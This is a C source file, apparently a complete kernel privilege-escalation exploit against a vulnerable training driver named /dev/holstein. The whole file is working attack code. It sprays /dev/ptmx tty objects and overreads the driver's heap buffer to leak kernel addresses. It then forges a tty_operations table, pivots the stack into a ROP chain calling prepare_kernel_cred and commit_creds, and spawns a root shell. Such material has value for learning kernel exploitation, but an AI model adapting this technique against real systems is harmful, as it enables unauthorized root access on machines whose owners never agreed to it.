#include<stdio.h>
#include<stdlib.h>
#include<fcntl.h>
#include<unistd.h>
#include<string.h>
#include<sys/ioctl.h>


#define ERR(msg) ({             \
            perror(msg);        \
            exit(EXIT_FAILURE); \
})

unsigned long user_rsp, user_cs, user_ss, user_rflags;
unsigned long tty_ops, g_buf, kbase;
int global_fd;

unsigned long commit_creds;
unsigned long prepare_kernel_cred;
unsigned long pop_rdi;
unsigned long pop_rcx;
unsigned long swapgs;
unsigned long mov_rdi_rax_rep;
char buff[0x500];

void save_state()
{
    asm(
            ".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_rsp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;"
       );
    puts("[+] save state");
}

void shell()
{
    char *argv[] = {"/bin/sh",NULL};
    char *envp[] = {NULL};
    puts("ROOOOT");
    execve("/bin/sh",argv,envp);
}

int main()
{
    save_state();

    int fd_spray[100];
    
    for(int i=0; i < 50;i++){
		fd_spray[i] = open("/dev/ptmx", O_RDONLY|O_NOCTTY);
		if(fd_spray[i]==-1){
			perror("/dev/ptmx");
			exit(EXIT_FAILURE);
		}
	}
	global_fd = open("/dev/holstein",O_RDWR);
	for(int i=50; i < 100;i++){
		fd_spray[i] = open("/dev/ptmx", O_RDONLY|O_NOCTTY);
		if(fd_spray[i]==-1){
			perror("/dev/ptmx");
			exit(EXIT_FAILURE);
		}
	}

    memset(buff,'A', 0x500);
    read(global_fd,buff,0x500);

    for(int i=0;i<0x480 / 8;i++){
		//printf("leaked = 0x%016lx\n" ,*(unsigned long*)(buff + i * 8));
		if((*(unsigned long*)(buff + i * 8) & 0xfff) == 0x880){
			tty_ops = *(unsigned long*)(buff + i * 8);
			continue;
		}
		if((*(unsigned long*)(buff + i * 8) & 0xfff) == 0x438){
			g_buf = *(unsigned long*)(buff + i * 8) - 0x438;
			break;
		}
	}
    //tty_ops = *(unsigned long*)(buff + 0x418);
    //g_buf = *(unsigned long*)(buff + 0x438) - 0x438;
    kbase = tty_ops - 0xc38880;
    pop_rdi = kbase + 0x0d748d;
    pop_rcx = kbase + 0x13c1c4;
    commit_creds = kbase + 0x0744b0;
    prepare_kernel_cred = kbase + 0x074650;
    mov_rdi_rax_rep = kbase + 0x62707b;
    swapgs = kbase + 0x800e26;
    printf("tty_ops: 0x%016lx\n" ,tty_ops);
    printf("kernel base: 0x%016lx\n" ,kbase);
    printf("k_buf : 0x%016lx\n" ,g_buf);

    unsigned long *p = (unsigned long *)&buff[0x400];
    p[12] = kbase + 0x3a478a; //rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp
    *(unsigned long*)(buff + 0x418) = g_buf + 0x400;
    printf("heap overwrite: 0x%016lx\n" ,*p);
    printf("fake pointer function: 0x%016lx\n" ,p[12]);
    printf("fake tty_operation: 0x%016lx\n" ,*(unsigned long*)(buff + 0x418));

    unsigned long *rop = (unsigned long*)&buff;
    *rop++ = pop_rdi;
    *rop++ = 0;
    *rop++ = prepare_kernel_cred;
    *rop++ = pop_rcx;
    *rop++ = 0;
    *rop++ = mov_rdi_rax_rep;
    *rop++ = commit_creds;
    *rop++ = swapgs;
    *rop++ = 0xdeadbeef;
    *rop++ = 0xdeadbeef;
    *rop++ = (unsigned long)shell;
    *rop++ = user_cs;
    *rop++ = user_rflags;
    *rop++ = user_rsp;
    *rop++ = user_ss;

    write(global_fd, buff,0x500);

    for(int i = 0; i < 100; i++){
        ioctl(fd_spray[i], 0xdeadbeef, g_buf - 0x10); //pop rsp r13 rbp
    }

    return EXIT_SUCCESS;
}
